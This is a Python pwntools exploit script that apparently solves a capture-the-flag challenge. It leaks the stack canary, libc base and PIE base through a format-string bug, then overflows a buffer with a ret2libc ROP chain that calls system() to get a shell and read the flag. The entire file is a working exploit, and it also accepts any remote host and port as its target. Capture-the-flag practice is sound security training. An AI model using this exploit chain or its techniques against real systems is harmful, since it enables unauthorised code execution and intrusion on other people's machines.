from pwn import *

# ---- gosip solver — format-string leaks -> canary+PIE bypass -> ret2libc ----
#
# mitigations: Canary + PIE + Full RELRO + NX  =>  no hardcoded addrs, no GOT
# overwrite; leak everything through printf(name)/printf(secret), then smash
# the seat buffer (read 0x200 into 56 bytes) in one shot.
#
# leak slots (THIS binary + the SHIPPED glibc 2.41):
#   %23$p            = stack canary   (main frame, low byte always 0x00)
#   %25$p - 0x29ca8  = libc base      (main's saved rip -> __libc_start_call_main)
#   %27$p - 0x125d   = pie base       (&main itself)
# slots reaching into libc frames CAN move between libc builds — if the
# asserts below fire, rerun fuzz_fmtstring.py and update the three constants.

import sys

context.log_level = 'info'
context.binary = elf = ELF('../source/chall', checksec=False)

CANARY_SLOT, LIBC_SLOT, PIE_SLOT = 23, 25, 27

# ---- glibc 2.41 (debian trixie — the exact pair shipped in chall.zip) ----
LIBC_RET_OFF = 0x29ca8
SYSTEM, BINSH, POP_RDI, RET = 0x53090, 0x1a5ea4, 0x2a145, 0x2846b
# ---- binary ----
MAIN_RVA = 0x125d
PAD = 56                       # seat -> canary


def make_io():
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    # default local target: the dockerized service (docker compose up -d in
    # source/). verified working over sockets; avoid bare process() pipes —
    # they mangle binary payloads and abort-path GPF, a known host quirk.
    return remote('127.0.0.1', 4412)


io = make_io()

# ---------------- stage 1: leaks via format string ----------------
io.recvuntil(b'who are you?\n')
io.sendline(b'kanari')
io.recvuntil(b"won't tell anyone.\n")
io.sendline(('%%%d$p %%%d$p %%%d$p' % (CANARY_SLOT, LIBC_SLOT, PIE_SLOT)).encode())
io.recvuntil(b'well:\n')
canary, libc_leak, pie_leak = [int(x, 16) for x in io.recvline().split()]

libc_base = libc_leak - LIBC_RET_OFF
pie_base = pie_leak - MAIN_RVA

info('canary    = %#x', canary)
info('libc base = %#x', libc_base)
info('pie base  = %#x', pie_base)

assert canary & 0xff == 0, 'canary slot wrong (low byte != 0) - rerun fuzz_fmtstring.py'
assert libc_base & 0xfff == 0, 'libc slot moved - rerun fuzz_fmtstring.py'
assert pie_base & 0xfff == 0, 'pie slot moved - rerun fuzz_fmtstring.py'

# ---------------- stage 2: overflow + ret2libc ----------------
rop = p64(libc_base + RET)             # keep rsp 16-aligned for system()
rop += p64(libc_base + POP_RDI)
rop += p64(libc_base + BINSH)
rop += p64(libc_base + SYSTEM)

payload = b'A' * PAD + p64(canary) + b'B' * 8 + rop

io.recvuntil(b'burns?\n')
io.send(payload)

# wait: read(0, seat, 0x200) is still live — sending the shell command now
# would get swallowed by it. ['gone now.' only prints after read() returned.]
io.recvuntil(b"it's all gone now.\n")
io.sendline(b'echo P73; cat flag.txt 2>/dev/null; cat ../source/flag.txt 2>/dev/null')
io.recvuntil(b'P73')
success('shell!')
io.interactive()
